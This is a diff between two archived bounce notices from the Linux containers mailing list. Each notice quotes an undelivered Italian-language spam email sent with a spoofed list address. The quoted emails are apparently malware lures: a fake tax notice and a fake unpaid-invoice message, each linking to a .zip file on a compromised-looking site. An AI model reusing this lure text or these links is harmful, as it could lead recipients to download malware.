@@ -1,9 +1,10 @@
-From: MAILER-DAEMON-+NbaIjSFD8nd8Zgiw/MPxQ@public.gmane.org (Mail Delivery System)
-Subject: Undelivered Mail Returned to Sender
-Date: Sun, 24 Mar 2013 22:12:13 -0700 (PDT)
-Message-ID: <20130325051213.0A6BB17842D57@c1mailgw12.amadis.com>
+From: Mail Delivery Subsystem <MAILER-DAEMON-cNOPY9FMLYsYi6lC9GrzQQ@public.gmane.org>
+Subject: Returned Mail:
+ Ordine N030321101
+Date: Mon, 25 Mar 2013 07:44:05 +0100 (CET)
+Message-ID: <600c81p2P6U04f@mi-ob.rzone.de>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="===============1405605174609382620=="
+Content-Type: multipart/mixed; boundary="===============4073019685609683871=="
 Return-path: <containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
 List-Unsubscribe: <https://lists.linuxfoundation.org/mailman/options/containers>,
 	<mailto:containers-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=unsubscribe>
@@ -17,106 +18,106 @@ Errors-To: containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public
 To: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 List-Id: containers.vger.kernel.org
 
-This is a MIME-encapsulated message.
+This is a MIME-encapsulated message
 
---===============1405605174609382620==
+--===============4073019685609683871==
 Content-Type: multipart/report; report-type=delivery-status;
-	boundary="8000017842BC8.1364188333/c1mailgw12.amadis.com"
+	boundary="600c81p2P6U04f/mi-ob.rzone.de"
 
-This is a MIME-encapsulated message.
+This is a MIME-encapsulated message
 
---8000017842BC8.1364188333/c1mailgw12.amadis.com
-Content-Description: Notification
-Content-Type: text/plain; charset=us-ascii
+--600c81p2P6U04f/mi-ob.rzone.de
+Content-Type: text/plain; charset=UTF-8
+Content-Disposition: inline
+Content-Transfer-Encoding: quoted-printable
 
-This is the mail system at host c1mailgw12.amadis.com.
+*** MAIL DELIVERY FAILURE REPORT ***
 
-I'm sorry to have to inform you that your message could not
-be delivered to one or more recipients. It's attached below.
+The original message was received at Mon, 25 Mar 2013 17:38:01 +1100
+from host [27.50.86.170].
 
-For further assistance, please send mail to postmaster.
+Subject: Ordine N030321101
+From: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 
-If you do so, please include this problem report. You can
-delete your own text from the attached returned message.
+Mail delivery to the following recipients has finally failed:
 
-                   The mail system
+roberta.nobel-VPKGYx3YSBgb1SvskN2V4Q@public.gmane.org
+   Last reason: 554 5.2.2=20
+   Explanation: Delivery failed: mailbox is full (quota exceeded)
 
-<byborabora-8Cmw1+NI3eNeoWH0uzbU5w@public.gmane.org>: host m2w-in1.ctmail.com[209.67.128.24] said: 550 5.1.1
-    <byborabora-8Cmw1+NI3eNeoWH0uzbU5w@public.gmane.org> is not a valid mailbox (in reply to RCPT TO command)
+   Transcript of session:
+   ... while trying to deliver at mi-ob.rzone.de:
+   >>> DELIVER
+   <<< 554 5.2.2 Delivery failed: mailbox is full (quota exceeded)
 
-<byboraboran-8Cmw1+NI3eNeoWH0uzbU5w@public.gmane.org>: host m2w-in1.ctmail.com[209.67.128.24] said: 550 5.1.1
-    <byboraboran-8Cmw1+NI3eNeoWH0uzbU5w@public.gmane.org> is not a valid mailbox (in reply to RCPT TO
-    command)
+roberta.november-VPKGYx3YSBgb1SvskN2V4Q@public.gmane.org
+   Last reason: 554 5.2.2=20
+   Explanation: Delivery failed: mailbox is full (quota exceeded)
 
-<byboraborann-8Cmw1+NI3eNeoWH0uzbU5w@public.gmane.org>: host m2w-in1.ctmail.com[209.67.128.24] said: 550
-    5.1.1 <byboraborann-8Cmw1+NI3eNeoWH0uzbU5w@public.gmane.org> is not a valid mailbox (in reply to RCPT TO
-    command)
+   Transcript of session:
+   ... while trying to deliver at mi-ob.rzone.de:
+   >>> DELIVER
+   <<< 554 5.2.2 Delivery failed: mailbox is full (quota exceeded)
 
---8000017842BC8.1364188333/c1mailgw12.amadis.com
-Content-Description: Delivery report
+--600c81p2P6U04f/mi-ob.rzone.de
 Content-Type: message/delivery-status
+Content-Disposition: attachment
 
-Reporting-MTA: dns; c1mailgw12.amadis.com
-X-Postfix-Queue-ID: 8000017842BC8
-X-Postfix-Sender: rfc822; containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
-Arrival-Date: Sun, 24 Mar 2013 22:12:05 -0700 (PDT)
+Reporting-MTA: DNS; mi-ob.rzone.de
+Received-From-MTA: DNS; SAU-71762-OR.sau.net.au (27.50.86.170)
+Arrival-Date: Mon, 25 Mar 2013 07:37:58 +0100 (CET)
 
-Final-Recipient: rfc822; byborabora-8Cmw1+NI3eNeoWH0uzbU5w@public.gmane.org
-Original-Recipient: rfc822;byborabora-8Cmw1+NI3eNeoWH0uzbU5w@public.gmane.org
+Final-Recipient: RFC822; roberta.nobel-VPKGYx3YSBgb1SvskN2V4Q@public.gmane.org
 Action: failed
-Status: 5.1.1
-Remote-MTA: dns; m2w-in1.ctmail.com
-Diagnostic-Code: smtp; 550 5.1.1 <byborabora-8Cmw1+NI3eNeoWH0uzbU5w@public.gmane.org> is not a valid mailbox
+Status: 5.2.2
+Diagnostic-Code: SMTP; 554 5.2.2 Delivery failed: mailbox is full (quota exceeded)
+Last-Attempt-Date: 
+Final-Log-ID: 600c81p2P6U0q2
 
-Final-Recipient: rfc822; byboraboran-8Cmw1+NI3eNeoWH0uzbU5w@public.gmane.org
-Original-Recipient: rfc822;byboraboran-8Cmw1+NI3eNeoWH0uzbU5w@public.gmane.org
+Final-Recipient: RFC822; roberta.november-VPKGYx3YSBgb1SvskN2V4Q@public.gmane.org
 Action: failed
-Status: 5.1.1
-Remote-MTA: dns; m2w-in1.ctmail.com
-Diagnostic-Code: smtp; 550 5.1.1 <byboraboran-8Cmw1+NI3eNeoWH0uzbU5w@public.gmane.org> is not a valid mailbox
+Status: 5.2.2
+Diagnostic-Code: SMTP; 554 5.2.2 Delivery failed: mailbox is full (quota exceeded)
+Last-Attempt-Date: 
+Final-Log-ID: 600c81p2P6U0q2
 
-Final-Recipient: rfc822; byboraborann-8Cmw1+NI3eNeoWH0uzbU5w@public.gmane.org
-Original-Recipient: rfc822;byboraborann-8Cmw1+NI3eNeoWH0uzbU5w@public.gmane.org
-Action: failed
-Status: 5.1.1
-Remote-MTA: dns; m2w-in1.ctmail.com
-Diagnostic-Code: smtp; 550 5.1.1 <byboraborann-8Cmw1+NI3eNeoWH0uzbU5w@public.gmane.org> is not a valid
-    mailbox
-
---8000017842BC8.1364188333/c1mailgw12.amadis.com
-Content-Description: Undelivered Message
+--600c81p2P6U04f/mi-ob.rzone.de
 Content-Type: message/rfc822
+Content-Disposition: attachment
 
-Received: from bruce1.publicoutreachgroup.com (unknown [27.50.89.200])
-	by c1mailgw12.amadis.com (Postfix) with ESMTP id 97A961783EFDF;
-	Sun, 24 Mar 2013 22:12:05 -0700 (PDT)
-Received: from [27.50.89.200] by bruce1.publicoutreachgroup.com id uClLveMsNDJNe; Mon, 25 Mar 2013 01:12:20 -0400
-Message-ID: <009801ce2917$51948e80$0200a8c0-F4yU/NW+unie0L4OLewF3vmPk1/qRCueuNZObgmCpkU@public.gmane.org>
-From: "devnull" <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-To: <byborabora-8Cmw1+NI3eNeoWH0uzbU5w@public.gmane.org>
-Subject: Fwd: Informa l'autorita fiscale.
-Date: Mon, 25 Mar 2013 01:12:20 -0400
+X-RZG-MI-VALUES: bm=8 mafl=1 sh=0 du=0 sp=9,90 vv=1 nf=0
+X-Strato-MessageType: email
+X-RZG-CLASS-ID: mi
+Received: from SAU-71762-OR.sau.net.au
+	(sau-55c56-or.sau.net.au [27.50.86.170])
+	by mailin.rzone.de (josoe mi52) (RZmta 31.22 OK)
+	with ESMTP id 600c81p2P6U0q2 ; Mon, 25 Mar 2013 07:37:58 +0100 (CET)
+Received: from [27.50.86.170] by SAU-71762-OR.sau.net.au id ky6oDcyvemDQ; Mon, 25 Mar 2013 17:38:01 +1100
+Message-ID: <009f01ce2923$49dae700$14000a0a-5X32oH+SWYHju/CiIO64j+23QSEHp/Li@public.gmane.org>
+From: "inform" <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+To: <roberta.nobel-VPKGYx3YSBgb1SvskN2V4Q@public.gmane.org>
+Subject: Ordine N030321101
+Date: Mon, 25 Mar 2013 17:38:01 +1100
 MIME-Version: 1.0
 Content-Type: text/plain;
 	charset="windows-1252"
-X-CTASD-RefID: str=0001.0A010205.514FDCA7.0070,ss=1,re=0.000,recu=0.000,reip=0.000,cl=1,cld=1,fgs=0
-X-CTASD-IP: 27.50.89.200
-X-CTASD-Sender: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
-x-ctasd: uncategorized
-x-ctasd-vod: uncategorized
-x-ctasd-station: 
 Content-Transfer-Encoding: quoted-printable
 
-         =20
-Gentile utente,     =20
-Ho preso il giusto tipo di verificare se tutti acquisiti solo      =20
-http://shrmstage.elt-inc.com/Info/Info.zip
+
+    =20
+Gentile utente, Monte Biz    =20
+
+Si prega di notare che hai una fattura non pagata.        =20
+
+Dettagli:      =20
+http://FIOREENATURA.COM.MX/Descrizione/Notare.zip
 
 
 
---8000017842BC8.1364188333/c1mailgw12.amadis.com--
+--600c81p2P6U04f/mi-ob.rzone.de--
 
---===============1405605174609382620==
+
+--===============4073019685609683871==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
@@ -126,4 +127,4 @@ _______________________________________________
 Containers mailing list
 Containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 https://lists.linuxfoundation.org/mailman/listinfo/containers
---===============1405605174609382620==--
+--===============4073019685609683871==--
